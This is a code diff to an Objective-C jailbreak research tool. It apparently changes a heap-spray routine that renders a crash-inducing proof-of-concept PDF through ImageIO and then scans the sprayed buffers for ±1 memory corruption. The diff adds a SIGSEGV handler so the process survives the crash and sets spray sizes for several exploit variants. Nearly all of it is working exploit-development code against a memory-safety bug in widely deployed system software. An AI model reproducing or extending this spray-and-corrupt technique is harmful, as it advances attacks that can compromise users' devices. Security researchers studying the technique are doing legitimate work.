@@ -14,6 +14,8 @@
 #import <malloc/malloc.h>
 #import <ImageIO/ImageIO.h>
 #import <CoreGraphics/CoreGraphics.h>
+#include <signal.h>
+#include <setjmp.h>
 
 #import <libjailbreak/info.h>
 #import <libjailbreak/primitives.h>
@@ -1089,12 +1091,25 @@ cleanup:
 // Fill with 0x42 → every u16 = 0x4242. After glyph, scan for u16 != 0x4242.
 // ±1 signature: 0x4243 (+1) or 0x4241 (-1). Report offset/old/new/delta.
 // ---------------------------------------------------------------------------
+// --- crash-catching handler for Glyph PoC (Calif trigger crashes by design) ---
+static sigjmp_buf kpGlyphJmp;
+static volatile sig_atomic_t kpGlyphCrashed;
+static void kpGlyphSegv(int sig) {
+    (void)sig;
+    kpGlyphCrashed = 1;
+    siglongjmp(kpGlyphJmp, 1);
+}
+
 + (NSString *)glyphTypedSprayReport:(NSString *)forceName {
     NSMutableString *r = [NSMutableString string];
     [r appendString:@"\n=== R5k: Glyph u16 ±1 typed spray ===\n"];
 
-    NSString *vname = forceName.length ? forceName : @"w1b";
-    size_t spraySz = kpGlyphSpraySize(vname.UTF8String);
+    NSString *vname = forceName.length ? forceName : @"calif";
+    // calif = official PoC (tx=32000 DX=33 N=9, no stepping stone)
+    size_t spraySz = 4288;  // calif coverage alloc ≈ 4*(1056+16)
+    if ([vname isEqualToString:@"w1a"] || [vname isEqualToString:@"w1b"] || [vname isEqualToString:@"w1c"]) spraySz = 4156;
+    else if ([vname isEqualToString:@"w4b"]) spraySz = 8252;
+    else if ([vname isEqualToString:@"w3a"]) spraySz = 4028;
     scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);
 
     NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5k-u16.txt"];
@@ -1125,26 +1140,34 @@ cleanup:
                   @"  sprayed %d bufs x %zu (u16=0x4242)  [live=%d holes=%d]  good_size=%zu",
                   got, spraySz, live, holes, goodSz]);
 
-    // ---- render glyph ----
+    // ---- render glyph (catch crash — Calif PoC crashes by design) ----
     NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
     if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
     {
-        NSURL *url = [NSURL fileURLWithPath:path];
-        CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
-        if (src) {
-            int sz = 256;
-            CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
-            const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
-                                   kCGImageSourceThumbnailMaxPixelSize };
-            const void *vals[] = { kCFBooleanTrue, szRef };
-            CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            scopeNote(r, @"  rendering glyph…");
-            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
-            scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
-            if (img) CGImageRelease(img);
-            CFRelease(opts); CFRelease(szRef); CFRelease(src);
+        kpGlyphCrashed = 0;
+        void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegv);
+        if (sigsetjmp(kpGlyphJmp, 1) != 0) {
+            scopeNote(r, @"  *** CAUGHT SIGSEGV during render (expected for Calif PoC) ***");
+        } else {
+            NSURL *url = [NSURL fileURLWithPath:path];
+            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+            if (src) {
+                int sz = 256;
+                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                       kCGImageSourceThumbnailMaxPixelSize };
+                const void *vals[] = { kCFBooleanTrue, szRef };
+                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                scopeNote(r, @"  rendering glyph…");
+                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+                if (img) CGImageRelease(img);
+                CFRelease(opts); CFRelease(szRef); CFRelease(src);
+            }
         }
+        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
+        if (kpGlyphCrashed) scopeNote(r, @"  render crashed — scanning spray anyway");
     }
 
     // ---- scan for u16 != 0x4242 (±1 signature = Glyph Grift) ----
